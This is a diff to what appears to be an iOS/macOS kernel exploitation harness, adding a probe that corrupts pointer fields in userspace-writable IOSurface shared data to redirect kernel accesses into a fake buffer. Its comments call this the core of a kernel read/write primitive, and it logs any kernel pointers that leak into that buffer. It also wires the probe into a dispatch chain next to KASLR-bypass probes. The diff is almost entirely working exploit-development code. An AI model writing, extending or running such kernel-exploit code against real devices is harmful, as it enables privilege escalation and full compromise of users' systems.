@@ -16694,6 +16694,236 @@ static void *r424_snoop_thread(void *arg) {
  * base), 32 candidates covering 0-512MB KASLR range.
  */
 
+/*
+ * r428: Shared data pointer redirect for kernel R/W.
+ *
+ * Key findings so far:
+ * - Shared data is R/W from userspace, kernel uses it
+ * - Integrity check at +88 is NOT validated by kernel
+ * - Fields at +112, +120, +128 are pointers to other structures
+ * - SetValue/CopyValue work even with corrupted integrity
+ *
+ * Now test: what happens when we modify the pointer fields?
+ * If the kernel dereferences +120 or +128 during an operation,
+ * and we redirect them to our fake structure in userspace memory,
+ * the kernel will read/write to our controlled memory.
+ *
+ * This is the core of a kernel R/W primitive without KASLR bypass.
+ *
+ * We test each field one at a time, with signal handling for crashes.
+ */
+
+static volatile int g_r428_crashed;
+static sigjmp_buf g_r428_jmp;
+
+static void r428_sighandler(int sig) {
+    g_r428_crashed = sig;
+    siglongjmp(g_r428_jmp, 1);
+}
+
+static void r428_probe(void) {
+    rlog("\n=== r428: Shared Data Pointer Redirect ===\n\n");
+    fflush(stdout);
+
+    unsigned pixFmt = 'BGRA';
+    const void *kk[] = {
+        kIOSurfaceWidth, kIOSurfaceHeight,
+        kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+        kIOSurfaceAllocSize
+    };
+    int w = 64, h = 64, bpr = 256, as = 16384;
+    CFNumberRef vv[] = {
+        CFNumberCreate(NULL, kCFNumberIntType, &w),
+        CFNumberCreate(NULL, kCFNumberIntType, &h),
+        CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+        CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+        CFNumberCreate(NULL, kCFNumberIntType, &as)
+    };
+    CFDictionaryRef sprops = CFDictionaryCreate(NULL, kk,
+        (const void**)vv, 5,
+        &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+
+    /* ---- Phase 1: Map shared data structure in detail ---- */
+    rlog("  Phase 1: Full shared data structure map\n");
+    IOSurfaceRef surf = IOSurfaceCreate(sprops);
+    uint32_t sid = IOSurfaceGetID(surf);
+    uint64_t clientRef = (uint64_t)surf;
+    uint64_t sharedPtr;
+    memcpy(&sharedPtr, (void *)(clientRef + 8), 8);
+
+    rlog("    Surface id=%u shared=0x%llx\n",
+        sid, (unsigned long long)sharedPtr);
+
+    /* Lock to populate all fields */
+    IOSurfaceLock(surf, 0, NULL);
+
+    /* Dump first 256 bytes with type annotations */
+    rlog("    Full shared data (256 bytes):\n");
+    for (int off = 0; off < 256; off += 8) {
+        uint64_t v;
+        memcpy(&v, (void *)(sharedPtr + off), 8);
+        rlog("      +%3d: 0x%016llx", off, (unsigned long long)v);
+
+        /* Annotate known fields */
+        if (off == 0) rlog(" [refcount/flags]");
+        else if (off == 40) rlog(" [mutex 'MUTZ']");
+        else if (off == 48) rlog(" [lock state?]");
+        else if (off == 56) rlog(" [mutex2 'MUTZ']");
+        else if (off == 80) rlog(" [sentinel -1]");
+        else if (off == 88) rlog(" [integrity ~(addr+0x28)]");
+        else if (off == 96) rlog(" [mutex3 'MUTZMUTZ']");
+        else if (off == 112) rlog(" [backing store base]");
+        else if (off == 120) rlog(" [connection/client ptr?]");
+        else if (off == 128) rlog(" [surface object ptr?]");
+        else if (off == 136) rlog(" [surface ID]");
+        else if (off == 144) rlog(" [alloc size]");
+        else if (off == 152) rlog(" [plane count?]");
+
+        if (v != 0 && (v >> 32) < 0x2 && v > 0x100000000ULL)
+            rlog(" [USER_PTR]");
+
+        rlog("\n");
+    }
+    IOSurfaceUnlock(surf, 0, NULL);
+    fflush(stdout);
+
+    /* ---- Phase 2: Test which fields kernel reads ---- */
+    /* For each pointer-like field, corrupt it and try operations.
+       If the kernel crashes, it reads that field.
+       If operations succeed, kernel doesn't use it from shared data. */
+    rlog("\n  Phase 2: Field dependency test\n");
+    {
+        struct sigaction oldSeg, oldBus, newAct;
+        memset(&newAct, 0, sizeof(newAct));
+        newAct.sa_handler = r428_sighandler;
+        sigemptyset(&newAct.sa_mask);
+
+        /* Test fields at offsets 112, 120, 128 */
+        int testOffsets[] = { 112, 120, 128 };
+        const char *testNames[] = {
+            "backing store base",
+            "connection/client ptr",
+            "surface object ptr"
+        };
+
+        for (int t = 0; t < 3; t++) {
+            int off = testOffsets[t];
+            rlog("\n    Testing +%d (%s):\n", off, testNames[t]);
+
+            /* Save original */
+            uint64_t origVal;
+            memcpy(&origVal, (void *)(sharedPtr + off), 8);
+            rlog("      Original: 0x%016llx\n",
+                (unsigned long long)origVal);
+
+            /* Allocate fake target */
+            uint8_t *fakeTarget = mmap(NULL, 65536,
+                PROT_READ | PROT_WRITE,
+                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+            memset(fakeTarget, 0, 65536);
+            rlog("      Fake target: %p\n", fakeTarget);
+
+            /* Corrupt field to point to our fake target */
+            uint64_t fakePtr = (uint64_t)fakeTarget;
+            memcpy((void *)(sharedPtr + off), &fakePtr, 8);
+
+            sigaction(SIGSEGV, &newAct, &oldSeg);
+            sigaction(SIGBUS, &newAct, &oldBus);
+            g_r428_crashed = 0;
+
+            if (sigsetjmp(g_r428_jmp, 1) == 0) {
+                /* Try SetValue */
+                CFStringRef testKey = CFSTR("r428_test");
+                int testVal = 12345;
+                CFNumberRef testNum = CFNumberCreate(NULL,
+                    kCFNumberIntType, &testVal);
+                IOSurfaceSetValue(surf, testKey, testNum);
+                CFRelease(testNum);
+
+                /* Check if kernel wrote to our fake target */
+                int anyWrite = 0;
+                for (int i = 0; i < 4096; i += 8) {
+                    uint64_t v;
+                    memcpy(&v, fakeTarget + i, 8);
+                    if (v != 0) {
+                        rlog("      *** Kernel wrote to fake +%d: 0x%016llx ***\n",
+                            i, (unsigned long long)v);
+                        anyWrite = 1;
+                        if ((v >> 32) >= 0xFFFFFFF0ULL) {
+                            rlog("      *** KERNEL POINTER LEAKED: 0x%016llx ***\n",
+                                (unsigned long long)v);
+                        }
+                    }
+                }
+                if (!anyWrite)
+                    rlog("      SetValue OK, no writes to fake target\n");
+
+                /* Try CopyValue */
+                if (sigsetjmp(g_r428_jmp, 1) == 0) {
+                    CFTypeRef readBack = IOSurfaceCopyValue(surf,
+                        CFSTR("r428_test"));
+                    if (readBack) {
+                        rlog("      CopyValue OK\n");
+                        CFRelease(readBack);
+                    } else {
+                        rlog("      CopyValue returned NULL\n");
+                    }
+                } else {
+                    rlog("      CopyValue CRASHED (sig=%d)\n",
+                        g_r428_crashed);
+                }
+
+                /* Try Lock */
+                g_r428_crashed = 0;
+                if (sigsetjmp(g_r428_jmp, 1) == 0) {
+                    IOSurfaceLock(surf, 0, NULL);
+                    IOSurfaceUnlock(surf, 0, NULL);
+                    rlog("      Lock/Unlock OK\n");
+                } else {
+                    rlog("      Lock CRASHED (sig=%d)\n",
+                        g_r428_crashed);
+                }
+            } else {
+                rlog("      SetValue CRASHED (sig=%d) — kernel reads +%d!\n",
+                    g_r428_crashed, off);
+            }
+
+            /* Restore original */
+            memcpy((void *)(sharedPtr + off), &origVal, 8);
+            sigaction(SIGSEGV, &oldSeg, NULL);
+            sigaction(SIGBUS, &oldBus, NULL);
+
+            /* Verify surface still works */
+            CFStringRef verifyKey = CFSTR("verify_after");
+            int vv2 = 999;
+            CFNumberRef vn = CFNumberCreate(NULL, kCFNumberIntType, &vv2);
+            IOSurfaceSetValue(surf, verifyKey, vn);
+            CFRelease(vn);
+            CFNumberRef rb = (CFNumberRef)IOSurfaceCopyValue(surf, verifyKey);
+            if (rb) {
+                int rv = 0;
+                CFNumberGetValue(rb, kCFNumberIntType, &rv);
+                rlog("      After restore: SetValue/CopyValue %s\n",
+                    rv == 999 ? "OK" : "WRONG");
+                CFRelease(rb);
+            } else {
+                rlog("      After restore: CopyValue FAILED\n");
+            }
+
+            munmap(fakeTarget, 65536);
+        }
+    }
+    fflush(stdout);
+
+    CFRelease(surf);
+    CFRelease(sprops);
+    for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+
+    rlog("\n=== r428 complete ===\n");
+    fflush(stdout);
+}
+
 static void r427_probe(void) {
     rlog("\n=== r427: High-Precision DMP KASLR Probe ===\n\n");
     fflush(stdout);
@@ -73275,6 +73505,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 431) {
+            rlog("*** rounds=431: Shared Data Pointer Redirect ***\n");
+            rlog("  Test kernel reads of shared data pointer fields +112/+120/+128.\n\n");
+            fflush(stdout);
+            r428_probe();
+            goto done;
+        }
         if (rounds == 430) {
             rlog("*** rounds=430: High-Precision DMP KASLR Probe ***\n");
             rlog("  10000 iters/candidate, 32 candidates at 16MB steps, z-score analysis.\n\n");
@@ -75877,7 +76114,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
